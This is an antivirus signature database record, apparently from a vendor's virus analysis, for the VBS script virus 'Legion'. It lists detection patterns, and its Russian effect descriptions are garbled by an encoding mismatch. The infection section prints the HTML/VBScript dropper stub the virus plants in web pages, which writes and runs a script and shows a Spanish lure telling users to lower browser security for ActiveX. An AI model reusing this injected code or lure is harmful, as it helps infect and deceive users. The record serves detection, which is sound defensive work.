<?xml version="1.0" encoding="Windows-1251"?>
<AVX VERSION="1.1">
  <VIRUS NAME="Virus.Script.VBS.Legion._" WILD="0" COMPLETE="0" SIZE="0">
    <COMMON>
      <FAMILY>Virus.Script.VBS.Legion</FAMILY>
      <VIRUS_TYPE>SCRIPT</VIRUS_TYPE>
      <VIRUS_TYPE>DROPPER</VIRUS_TYPE>
      <VIRUS_TYPE>STEALTH</VIRUS_TYPE>
      <EXTRA_INFO />
    </COMMON>
    <INFECT>
      <EXECUTE_TYPE>VBS</EXECUTE_TYPE>
      <INFECT_FILE TYPE="">
        <METHOD />
      </INFECT_FILE>
      <OS_FAMILY>WINDOWS 9x</OS_FAMILY>
      <OS_FAMILY>WINDOWS NT</OS_FAMILY>
      <INFECT_FILE_INFO>�����, ��� �������, ��� �������� ����� ������� HKCU\software\Legion �� ����� sistem = Infected, ���������� ����������� ����� ������ "htt", "htm", "html" �� ���� ��������� ������ � �������� ������ ��������� ����, ��������� � ��� ������ ��������� ���:
<![CDATA[			
<html> <body> <script language="vbscript">
ON ERROR RESUME NEXT
Set fsoafwwqj = CreateObject("scripting.filesystemobject")
Set Fsafwwqj= fsoafwwqj.CreateTextFile(fsoafwwqj.getspecialfolder(0) & "\Temp.vbs" , True)
Fsafwwqj.write""
Fsafwwqj.Close
Set wsafwwqj = CreateObject("wscript.shell")
wsafwwqj.run fsoafwwqj.getspecialfolder(0) & "\wscript.exe " & fsoafwwqj.getspecialfolder(0) & "\Temp.vbs %"
If err.number <> 0 Then
alert("Error." & vbCrLf & "Esta pagina requiere ActiveX para funcionar correctamente." & vbCrLf & "Presione Actualizar y acepte la ejecucion de ActiveX." & vbCrLf & "Si no se le permite aceptar ActiveX, baje el nivel de seguridad de " & vbCrLf & "su navegador, o busque como permitir esta interaccion." & vbCrLf & "")
End If
</script> </body/> </html>
]]>.
			</INFECT_FILE_INFO>
      <EFFECTS_INFO>����� ��������� ���� �� �����, �������� ���� � ��������� �����, �������� ��������� �������, ����� �������� ������ ���������� �������. ����������� �������-�����. 2-�� ����� ������� ������ ����� ������� �� ����� ��������� "La Conquista ah llegado termino el juego". ����� �������� ������� ��� ����� �� ����� ����� �, ���������� "Windows", "System", "Command". �������� ���������� "autoexec.bat".����� ���� � ������� ������������ �� ��������� ��������������.
			
			</EFFECTS_INFO>
    </INFECT>
    <CURE />
    <RESEARCH RESEARCHER="Oleg Y. Zykov" DATE_CREATE="13.04.2006" />
    <DETECTION>
      <SIGNATURE TYPE="SCRIPT" GROUP="0" FILE="I-Worm.Legion" OFFSET="0" LEVEL="0">
        <PART NUMBER="0"><![CDATA[[PID=1];KW IF;ID "FileExists";ID {0};OP AMPERS;STR;KW THEN;ID;OP EQU;ID {0};OP AMPERS;STR;ID;ID "DeleteFile";ID {0};OP AMPERS;STR;]]></PART>
        <PART NUMBER="1"><![CDATA[[PID=1];ID;ID "regwrite";STR "HKCU\software\Legion";STR "sistem = Infected";]]></PART>
        <PART NUMBER="2"><![CDATA[[PID=1];KW IF;ID "day";ID "now";OP EQU;NUM 2;KW THEN;ID "MSGBOX";STR "La Conquista ah llegado termino el juego";NUM 16;STR "Virus Legion";]]></PART>
      </SIGNATURE>
    </DETECTION>
  </VIRUS>
</AVX>